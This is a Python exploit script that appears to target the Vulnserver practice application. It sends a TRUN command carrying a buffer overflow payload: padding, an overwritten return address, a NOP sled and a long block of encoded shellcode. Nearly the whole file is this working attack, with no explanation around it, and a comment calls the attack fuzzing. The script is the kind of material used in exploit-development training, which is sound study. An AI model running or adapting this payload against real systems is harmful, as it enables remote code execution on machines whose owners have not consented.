#!/usr/bin/python 
import socket
import sys
import time
if len(sys.argv) < 4 :
	print >>sys.stderr, "Please provide IP and Port and size on the command line"
	print >>sys.stderr, "Usage: %s <IP> <Port> <size>" % sys.argv[0]
	sys.exit("Could not connect!")
	
ip=sys.argv[1]
port=sys.argv[2]
size=int(sys.argv[3])
buffer="A"*2003+"\xaf\x11\x50\x62"+"\x90"*32
buffer += "\xdb\xdd\xd9\x74\x24\xf4\x58\xbf\x63\x6e\x69\x90\x33"
buffer += "\xc9\xb1\x52\x83\xe8\xfc\x31\x78\x13\x03\x1b\x7d\x8b"
buffer += "\x65\x27\x69\xc9\x86\xd7\x6a\xae\x0f\x32\x5b\xee\x74"
buffer += "\x37\xcc\xde\xff\x15\xe1\x95\x52\x8d\x72\xdb\x7a\xa2"
buffer += "\x33\x56\x5d\x8d\xc4\xcb\x9d\x8c\x46\x16\xf2\x6e\x76"
buffer += "\xd9\x07\x6f\xbf\x04\xe5\x3d\x68\x42\x58\xd1\x1d\x1e"
buffer += "\x61\x5a\x6d\x8e\xe1\xbf\x26\xb1\xc0\x6e\x3c\xe8\xc2"
buffer += "\x91\x91\x80\x4a\x89\xf6\xad\x05\x22\xcc\x5a\x94\xe2"
buffer += "\x1c\xa2\x3b\xcb\x90\x51\x45\x0c\x16\x8a\x30\x64\x64"
buffer += "\x37\x43\xb3\x16\xe3\xc6\x27\xb0\x60\x70\x83\x40\xa4"
buffer += "\xe7\x40\x4e\x01\x63\x0e\x53\x94\xa0\x25\x6f\x1d\x47"
buffer += "\xe9\xf9\x65\x6c\x2d\xa1\x3e\x0d\x74\x0f\x90\x32\x66"
buffer += "\xf0\x4d\x97\xed\x1d\x99\xaa\xac\x49\x6e\x87\x4e\x8a"
buffer += "\xf8\x90\x3d\xb8\xa7\x0a\xa9\xf0\x20\x95\x2e\xf6\x1a"
buffer += "\x61\xa0\x09\xa5\x92\xe9\xcd\xf1\xc2\x81\xe4\x79\x89"
buffer += "\x51\x08\xac\x1e\x01\xa6\x1f\xdf\xf1\x06\xf0\xb7\x1b"
buffer += "\x89\x2f\xa7\x24\x43\x58\x42\xdf\x04\xa7\x3b\xde\xac"
buffer += "\x4f\x3e\xe0\x57\xa9\xb7\x06\x0d\xd9\x91\x91\xba\x40"
buffer += "\xb8\x69\x5a\x8c\x16\x14\x5c\x06\x95\xe9\x13\xef\xd0"
buffer += "\xf9\xc4\x1f\xaf\xa3\x43\x1f\x05\xcb\x08\xb2\xc2\x0b"
buffer += "\x46\xaf\x5c\x5c\x0f\x01\x95\x08\xbd\x38\x0f\x2e\x3c"
buffer += "\xdc\x68\xea\x9b\x1d\x76\xf3\x6e\x19\x5c\xe3\xb6\xa2"
buffer += "\xd8\x57\x67\xf5\xb6\x01\xc1\xaf\x78\xfb\x9b\x1c\xd3"
buffer += "\x6b\x5d\x6f\xe4\xed\x62\xba\x92\x11\xd2\x13\xe3\x2e"
buffer += "\xdb\xf3\xe3\x57\x01\x64\x0b\x82\x81\x84\xee\x06\xfc"
buffer += "\x2c\xb7\xc3\xbd\x30\x48\x3e\x81\x4c\xcb\xca\x7a\xab"
buffer += "\xd3\xbf\x7f\xf7\x53\x2c\xf2\x68\x36\x52\xa1\x89\x13"


print("attempting to connect and fuzz at %s:%s" % (ip, port))
try:
	s = socket.create_connection((ip,port))
	##########################################################################
	# modify the section directly below to accommodate receiving and sending #
	# proper data! otherwise this will only work for what it was written for!#
	##########################################################################
	data = s.recv(1024)
	s.send("TRUN /.:/" + buffer)
	data = s.recv(1024)
	data = s.send("EXIT")
	print(data)
	#########################
	# End modification area.#
	#########################
except:
	s.close()
print("done")
